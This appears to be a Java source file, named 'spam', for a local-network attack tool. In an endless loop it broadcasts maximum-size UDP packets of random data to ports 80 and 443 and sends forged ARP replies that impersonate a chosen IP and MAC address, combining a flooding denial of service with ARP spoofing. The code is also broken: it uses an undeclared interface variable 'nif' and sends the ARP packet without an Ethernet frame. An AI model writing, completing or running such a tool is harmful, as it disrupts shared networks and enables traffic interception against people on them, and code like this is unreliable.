import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Random;

import org.pcap4j.core.*;
import org.pcap4j.packet.*;
import org.pcap4j.packet.namednumber.*;
import org.pcap4j.util.*;
import org.pcap4j.core.PcapHandle.*;
import org.pcap4j.core.PcapNetworkInterface.*;


public class spam {
    public static void main(String[] args) {
        try {
            DatagramSocket socket = new DatagramSocket();
            socket.setBroadcast(true); // Enable broadcast

            InetAddress address = InetAddress.getByName("255.255.255.255");
            byte[] buffer = new byte[65507]; // Maximum UDP packet size

            int[] ports = {80, 443}; // Define your ports here

            String[] colorStrings = {"\u001B[31m","\u001B[32m","\u001B[33m","\u001B[34m","\u001B[35m","\u001B[36m"};
            String ANSI_RESET = "\u001B[0m";

            Random random = new Random();

            String gatewayIp = "192.168.1.1"; // Replace with your gateway IP
            String spoofedIp = "192.168.1.100"; // Replace with the IP you want to spoof
            MacAddress spoofedMac = MacAddress.getByName("00:11:22:33:44:55"); // Replace with the MAC address you want to spoof

            PcapHandle handle = nif.openLive(
                65536, // Taille du buffer (en octets)
                PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, // Mode Promiscuous
                10 // Timeout en millisecondes
            );

            InetAddress targetIp = InetAddress.getByName(gatewayIp);
            MacAddress targetMac = MacAddress.getByName("ff:ff:ff:ff:ff:ff"); // Broadcast MAC address

            ArpPacket.Builder arpBuilder = new ArpPacket.Builder();
            arpBuilder.hardwareType(ArpHardwareType.ETHERNET            )
                      .protocolType(EtherType.IPV4)
                      .hardwareAddrLength((byte) MacAddress.SIZE_IN_BYTES)
                      .protocolAddrLength((byte) 4)
                      .operation(ArpOperation.REPLY)
                      .srcHardwareAddr(spoofedMac)
                      .srcProtocolAddr(InetAddress.getByName(spoofedIp))
                      .dstHardwareAddr(targetMac)
                      .dstProtocolAddr(targetIp);

            Packet arpPacket = arpBuilder.build();

            while (true) {
                // Fill buffer with random hexadecimal digits
                for (int i = 0; i < buffer.length; i++) {
                    buffer[i] = (byte) (random.nextInt(16) + '0');
                    if (buffer[i] > '9') {
                        buffer[i] += ('A' - '9' - 1);
                    }
                }

                for (int port : ports) {
                    DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, port);
                    socket.send(packet);
                    System.out.println("Packet sent to port : " + colorStrings[random.nextInt(colorStrings.length)] + port + ANSI_RESET);
                }
                handle.sendPacket(arpPacket);
                System.out.println("ARP packet sent to spoof gateway IP: " + gatewayIp);
                Thread.sleep(1); // Adjust the sleep time as needed
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}